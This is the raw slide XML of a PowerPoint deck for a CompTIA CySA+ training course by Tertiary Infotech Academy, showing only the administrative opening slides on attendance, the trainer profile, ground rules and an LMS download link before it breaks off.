<file path=ppt/slides/_rels/slide5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 Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image49.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide5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8.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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7.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image46.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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0.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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1.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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2.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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3.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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4.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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5.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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6.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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7.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide6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8.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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s>
</file>

<file path=ppt/slides/_rels/slide7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9.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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0.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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1.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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2.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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4.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image63.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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6.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image68.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image70.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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1.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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2.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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5.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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3.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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4.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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5.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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6.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide7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7.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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8.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image79.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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0.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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1.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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2.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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3.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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4.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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5.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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6.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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7.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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8.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide8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ertiary_logo.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="640080"/>
            <a:ext cx="960120" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="cysa_logo.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9966960" y="548640"/>
            <a:ext cx="1234440" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2103120"/>
            <a:ext cx="10972800" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>COURSE SLIDES  ·  WSQ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2606040"/>
            <a:ext cx="10972800" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="3800" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CompTIA Cybersecurity Analyst (CySA+) Training</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841248" y="4343400"/>
            <a:ext cx="2194560" cy="54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4617720"/>
            <a:ext cx="10972800" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>WSQ Course Code: TGS-2024049211</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>WSQ TSC: Cyber Risk Management (ICT-SNA-4007-1.1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Conducted by Tertiary Infotech Academy Pte Ltd  ·  UEN 201200696W</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5943600"/>
            <a:ext cx="10972800" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Version v8  ·  18 Aug 2026</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="6263640"/>
            <a:ext cx="10972800" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>© 2026 Tertiary Infotech Academy Pte Ltd. All rights reserved.  ·  www.tertiarycourses.com.sg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COURSE ADMINISTRATION</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Welcome &amp; Housekeeping</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TRAQOM · SSG DIGITAL ATTENDANCE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Digital Attendance (Mandatory)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It is mandatory to take the AM, PM and Assessment digital attendance for WSQ-funded courses.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The trainer/administrator displays the digital attendance QR code from the SSG portal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scan the QR code with your mobile phone camera and submit your attendance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A minimum of 75% attendance is required to be eligible for assessment and funding.</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5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>YOUR TRAINER · GENERAL</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About the Trainer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Your Trainer</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General Trainer template —
to be completed by the trainer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="17830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563880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>NAME</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>____________________________________________</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="252984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52984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529840"/>
            <a:ext cx="6400800" cy="563880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>TITLE / DESIGNATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>____________________________________________</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="327660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3276600"/>
            <a:ext cx="91440" cy="563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3276600"/>
            <a:ext cx="6400800" cy="563880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="7C3AED"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>QUALIFICATIONS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>____________________________________________</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="402336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4023360"/>
            <a:ext cx="91440" cy="563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4023360"/>
            <a:ext cx="6400800" cy="563880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F59E0B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>AREAS OF EXPERTISE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>____________________________________________</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Rectangle 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="477012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480560" y="477012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773168" y="4770120"/>
            <a:ext cx="6400800" cy="563880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>TRAINING &amp; INDUSTRY EXPERIENCE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>____________________________________________</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="55168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480560" y="551688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773168" y="5516880"/>
            <a:ext cx="6400800" cy="563880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CONTACT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>____________________________________________</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YOUR TRAINER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About the Trainer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AA</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Dr. Alfred Ang</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Principal Trainer
Tertiary Infotech Academy Pte. Ltd.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="178308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9372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937260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="1F6FEB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>ROLE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Principal Trainer, Tertiary Infotech Academy Pte. Ltd.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="290322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903220"/>
            <a:ext cx="91440" cy="9372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903220"/>
            <a:ext cx="6400800" cy="937260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>EXPERTISE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Cybersecurity, SOC operations, data science, AI and machine learning.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="402336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4023360"/>
            <a:ext cx="91440" cy="9372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4023360"/>
            <a:ext cx="6400800" cy="937260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="7C3AED"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>DELIVERS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>WSQ courses on CompTIA certifications, cybersecurity, AI &amp; data analytics.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="514350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5143500"/>
            <a:ext cx="91440" cy="9372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5143500"/>
            <a:ext cx="6400800" cy="937260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F59E0B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>FOUNDER</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Founder and lead instructor at Tertiary Infotech / Tertiary Courses.</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ICE-BREAKER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Let's Know Each Other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Your name and organisation / role.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Your experience with security operations and SOC tools (if any).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  What you want to get out of this CySA+ course.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  One security incident or tool you are curious about.</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HOUSEKEEPING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Ground Rules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Set your mobile phone to silent mode.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Participate actively — no question is too small.</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Mutual respect: agree to disagree.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One conversation at a time.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Be punctual; return from breaks on time.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75% attendance is required.</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COURSE PORTAL · LMS / TMS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Download Course Material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lms_screenshot.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5852160" y="2346884"/>
            <a:ext cx="5577840" cy="3170072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1920240"/>
            <a:ext cx="4846320" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Log in to the Tertiary Infotech LMS/TMS portal:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  https://lms-tms.tertiaryinfotech.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Download the Course Slides and Learner Guide.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
